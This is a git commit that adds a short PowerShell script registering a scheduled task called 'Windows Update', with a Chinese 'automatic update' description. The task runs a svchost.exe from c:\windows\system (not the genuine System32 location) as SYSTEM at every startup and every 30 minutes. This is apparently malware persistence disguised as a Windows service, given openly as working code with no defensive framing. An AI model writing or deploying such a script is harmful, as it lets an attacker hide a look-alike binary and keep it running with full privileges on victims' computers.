87358f470ca05e4dbf651675c25292f9873fafb5
wuxin1996 <36785387+wuxin1996@users.noreply.github.com>
2018-02-25 12:05:34 +0800

    Add files via upload

---
+++ task.ps1
@@ -0,0 +1,8 @@
+﻿$action = New-ScheduledTaskAction -Execute 'c:\windows\system\svchost.exe' -WorkingDirectory 'c:\windows\system\'
+$trigger =  New-ScheduledTaskTrigger -AtStartup
+$prin = New-ScheduledTaskPrincipal  -UserId "S-1-5-18" -LogonType ServiceAccount
+Register-ScheduledTask -Action $action -Trigger $trigger -Principal $prin -TaskName  "Windows Update" -Description "Windows自动更新计划"
+$t = Get-ScheduledTask -TaskName "Windows Update"
+$t.Triggers.repetition.Interval = "PT30M"    #every 30 mins
+$t | Set-ScheduledTask
+Start-ScheduledTask -TaskName "Windows Update"
